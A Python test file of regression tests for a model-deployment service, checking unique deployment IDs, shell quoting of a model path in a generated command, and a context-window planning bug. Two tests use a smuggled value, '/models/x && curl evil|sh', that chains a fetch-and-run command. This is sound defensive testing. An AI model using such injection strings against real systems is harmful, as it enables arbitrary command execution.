"""Regressions found by the QA pass.

Every test here corresponds to a defect that was reproduced before it was fixed,
so a later refactor cannot quietly bring it back. The QA report also noted that
none of these paths had any coverage, which is why they survived so long.
"""
import shlex
from types import SimpleNamespace

import pytest

from app.services import deployments, planner
from app.services.estimator import GIB, ModelProfile, plan_window


def test_deployment_ids_are_unique_within_the_same_second():
    """IDs used to be dep_{int(time.time())}: same-second creates overwrote.

    Three rapid creates produced one id and one surviving record.
    """
    saved = dict(deployments.DEPLOYMENTS)
    deployments.DEPLOYMENTS.clear()
    try:
        ids = [
            deployments.create(model_path=f"/m/{i}", model_id=f"m{i}", backend="vllm")["id"]
            for i in range(5)
        ]
        assert len(set(ids)) == 5
        assert len(deployments.DEPLOYMENTS) == 5
    finally:
        deployments.DEPLOYMENTS.clear()
        deployments.DEPLOYMENTS.update(saved)


def test_command_string_escapes_model_path():
    """command_string is copied into a shell, so metacharacters must stay literal.

    A path of "/models/x && curl evil|sh" used to produce a string that ran a
    second command when pasted into a terminal.
    """
    evil = "/models/x && curl evil|sh"
    result = planner.preview(
        planner.PlanRequest(model_id="qwen3-8b", model_path=evil, backend="llama.cpp")
    )
    command_string = result["command_string"]
    # Parsing the string back must yield the original single argument.
    parts = shlex.split(command_string)
    assert parts[parts.index("-m") + 1] == evil
    # And the injected separator must not survive outside the quoted argument.
    assert "&& curl" not in command_string.replace(evil, "")


def test_command_argv_stays_a_plain_argument_list():
    """Only the display string is quoted; the structured argv must be untouched."""
    evil = "/models/x && curl evil|sh"
    result = planner.preview(
        planner.PlanRequest(model_id="qwen3-8b", model_path=evil, backend="llama.cpp")
    )
    argv = result["command"]
    assert isinstance(argv, list)
    assert argv[argv.index("-m") + 1] == evil


@pytest.mark.xfail(
    strict=True,
    reason="B-08 in docs/qa-findings-backend.md: plan_window starts at the 64K floor "
    "and the loop condition window <= cap is false when the model's native window is "
    "smaller, so it returns 64K for a 32K model.",
)
def test_plan_window_never_exceeds_native_context():
    """A model with a 32K native window must not be planned at 64K.

    The floor is a promise about the window we want, not a licence to exceed what
    the model was trained for. strict=True means fixing this turns the xfail into
    an XPASS failure, which is the prompt to delete the marker.
    """
    profile = ModelProfile(
        weights_bytes=1 * GIB,
        layers=32,
        kv_bytes_per_token=1024,
        n_vocab=150000,
        native_window=32768,
    )
    budget = SimpleNamespace(usable_vram_bytes=8 * GIB, uma=True)
    assert plan_window(profile, budget) <= profile.native_window
